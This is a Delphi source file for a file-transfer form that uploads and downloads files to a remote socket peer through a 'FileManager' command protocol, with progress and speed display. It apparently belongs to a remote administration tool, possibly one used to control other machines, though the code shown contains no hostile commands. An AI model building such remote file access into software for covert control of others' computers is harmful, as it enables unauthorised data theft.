unit UnitFileTransfer;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  Menus, ImgList, ToolWin, ComCtrls , math,
  ClipBrd, UnitSharedData, shellapi,CommCtrl;

type
  TFileTransfer = class(TForm)
    Label1: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    ProgressBar1: TProgressBar;
    Timer1: TTimer;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
  public
    { Public declarations }
    ListItem: TListItem;
    Uploading: bool;
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    OldNum: int64;
    Progress: int64;
    NewProgress,NewMax: int64;
    Counter: integer;
    FileHandle: THandle;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
    procedure SetUpConnection2(Socket: TCustomWinSocket);
  end;

var
  FileTransfer: TFileTransfer;

implementation

{$R *.dfm}

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SOcketData.DisconnectProc := nil;
  TFileTransfer(SocketData.Form).NewSocket := nil;
  TFileTransfer(SocketData.Form).Close;
end;

function RoundD(x: Extended; d: Integer): Extended;
var
  n: Extended;
begin
  n := IntPower(10, d);
  x := x * n;
  Result := (Int(x) + Int(Frac(x) * 2)) / n;
end;

function Percent(Progress,Max: int64): string;
var
  n: extended;
begin
  Result := '0%';
  if (Progress = 0) or (Max = 0) then exit; 
  n := 100 * Progress / Max;
  if n > 100 then n := 0;
  if n < 0 then n := 0;
  //result := floattostr(n) + '%';
  result := floattostr(RoundD(n,2)) + '%';
end;

{Function Percent(dProgress, dTotal: Integer): String;
Var
  R     :Real;
  S     :Real;
  C     :Integer;

  Function RToInt(E: Real): Integer;
  Var
    S: String;
  Begin
    S := Format('%N', [E]);
    If (Pos('.', S) > 0) Then
      S := Copy(S, 1, Pos('.', S) - 1);
    While Pos(',', S) > 0 Do
      Delete(S, Pos(',', S), 1);
    While Pos(' ', S) > 0 Do
      Delete(S, Pos(' ', S), 1);
    While Pos(#160, S) > 0 Do
      Delete(S, Pos(#160, S), 1);
    Result := StrToInt(S);
  End;

Begin
  If (dTotal = 0) Then begin
    Result := '0%';
    exit;
  end;
  C := 0;
  R := dTotal / 100;
  S := 0;
  While RToInt(S) < dProgress Do
  Begin
    S := S + R;
    Inc(C);
  End;
  if c > 100 then c := 100;
  Result := IntToStr(C) + '%';
End; }

procedure ReceiveDataProc(Socket: TCustomWinSocket; Progress,Max: int64);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  {TFileTransfer(SocketData.Form).ProgressBar1.Max := Max;
  TFileTransfer(SocketData.Form).ProgressBar1.Position := Progress;
  TFileTransfer(SocketData.Form).NewProgress := Progress;
  TFileTransfer(SocketData.Form).NewMax := Max;}
end;

procedure SendDataProc(Socket: TCustomWinSocket; Progress,Max: int64);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  {TFileTransfer(SocketData.Form).ProgressBar1.Max := Max;
  TFileTransfer(SocketData.Form).ProgressBar1.Position := Progress;
  TFileTransfer(SocketData.Form).NewProgress := Progress;
  TFileTransfer(SocketData.Form).NewMax := Max;}
end;

function SendData(Socket: TCustomWinSocket; Data: string): bool;
begin
  Result := UnitSharedData.SendData(Socket,'FileManager|' + Data);
end;

procedure TFileTransfer.SetUpConnection2(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  SocketData.SendDataProc := @SendDataProc;
end;

procedure TFileTransfer.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
  Stream: TMemoryStream;
  Data: string;
  filesize,p: int64;
  BytesRead: dword;
  FileHandle: THandle;

begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  SocketData.ReceiveDataProc := @ReceiveDataProc;
  SocketData.SendDataProc := @SendDataProc;

  ListItem.Data := Self; //Socket;

  if Uploading then begin

    {try
      Stream := TMemoryStream.Create;
      Stream.LoadFromFile(Listitem.SubItems[0]);
      SetString(Data,Pchar(Stream.Memory),Stream.Size);
      Stream.Free;
      UnitSharedData.SendData(Socket,'FileManager|Upload|' + Listitem.SubItems[1] + '|' + Data);
    except
    end;}

    p := 0;
    FileHandle := CreateFile(pchar(Listitem.SubItems[0]),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    FileSize := GetFileSize(FileHandle,nil);
    NewMax := FileSize;
    SendData(Socket,'OpenFile|' + Listitem.SubItems[1]);
    SetLength(Data,4096);
    while P < FileSize do begin
      Sleep(10);
      Application.ProcessMessages;
      Inc(P,4096);
      NewProgress := p;
      ReadFile(FileHandle,pointer(Data)^,4096,BytesRead,0);
      if not SendData(Socket,'WriteFile|' + Data) then Break;
    end;
    SendData(Socket,'CloseFile');
    CloseHandle(FileHandle);
    Close;


  end else begin

    if not SendData(Socket,'Download|' + ListItem.SubItems[1]) then Close;
    NewProgress := 0;
    NewMax := 0;

  end;

end;

procedure TFileTransfer.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  BytesWritten: dword;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  {if Command = 'Download' then begin
    Stream := TMemoryStream.Create;
    try
      Stream.Write(pointer(Data)^,Length(Data));
      if Stream.Size > 0 then Stream.SaveToFile(ListItem.SubItems[0]);
    except
    end;
    Stream.Free;
    Close;
  end;}

  if Command = 'OpenFile' then begin
    FileHandle := CreateFile(pchar(ListItem.SubItems[0]),GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
    NewMax := strtoint(Data);
    NewProgress := 0;
  end;

  if Command = 'WriteFile' then begin
    Inc(NewProgress,Length(Data));
    WriteFile(FileHandle,pointer(Data)^,Length(Data),BytesWritten,nil);
  end;

  if Command = 'CloseFile' then begin
    CloseHandle(FileHandle);
    Close;
  end;

end;

function AddLeadingZeroes(const aNumber, Length : integer) : string;
begin
   result := SysUtils.Format('%.*d', [Length, aNumber]) ;
end;

function MSecToTime(mSec: Int64): string;
const
  ticksperday: Integer    = 1000 * 60 * 60 * 24;
  ticksperhour: Integer   = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;
var
  t: int64;
  h, m, s: Integer;
begin
  t := mSec;

  //d := t div ticksperday;
  //Dec(t, d * ticksperday);

  h := t div ticksperhour;
  Dec(t, h * ticksperhour);

  m := t div ticksperminute;
  Dec(t, m * ticksperminute);

  s := t div tickspersecond;

  //Result := AddLeadingZeroes(d) + ':' +
  Result := AddLeadingZeroes(h,2) + ':' + AddLeadingZeroes(m,2) + ':' + AddLeadingZeroes(s,2);

end;

procedure TFileTransfer.Timer1Timer(Sender: TObject);
var
  Num: int64;
  kbs: int64;
  KbsLeft: int64;
  SecondsLeft: int64;
  SocketData: TSocketData;
begin
  inc(Counter);
  if Counter >= 30 then begin
    Close;
    Exit;
  end;

  if NewSocket = nil then exit;
  Counter := 0;

  if ListItem <> nil then ListItem.SubItems[3] := Percent(NewProgress,NewMax);

  Num := NewProgress; //Progressbar1.Position;

  kbs := Num - OldNum;

  if kbs < 0 then kbs := 0;
  if ListItem <> nil then ListItem.SubItems[4] := FileSizeToStr(Kbs) + '/s';  //inttostr(kbs div 1024);

  Label3.Caption := 'Speed: ' + FileSizeToStr(Kbs) + '/s';//inttostr(kbs div 1024) + ' kbs';
  OldNum := Num;

  KbsLeft := NewMax - NewProgress;  //Progressbar1.Max - Progressbar1.Position;

  if (KbsLeft = 0) or (kbs = 0) then exit;

  SecondsLeft := KbsLeft div kbs;
  if ListItem <> nil then ListItem.SubItems[5] := MSecToTime(SecondsLeft * 1000);
  Label4.Caption := 'Time Remaining: ' + MSecToTime(SecondsLeft * 1000);

  Application.ProcessMessages;
end;

procedure TFileTransfer.FormCreate(Sender: TObject);
begin
  OldNum := 0;
end;

procedure TFileTransfer.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
  TmpItem: TListItem;
begin
  Action := caFree;

  try
    if ListItem <> nil then begin
      TmpItem := ListItem;
      ListItem := nil;
      TmpItem.Delete;
    end;
  except
  end;

  try
    if NewSocket <> nil then begin
      TmpSocket := NewSocket;
      NewSocket := nil;
      TSocketData(TmpSocket).DisconnectProc := nil;
      TmpSocket.Close;
    end;
  except
  end;

end;

end.
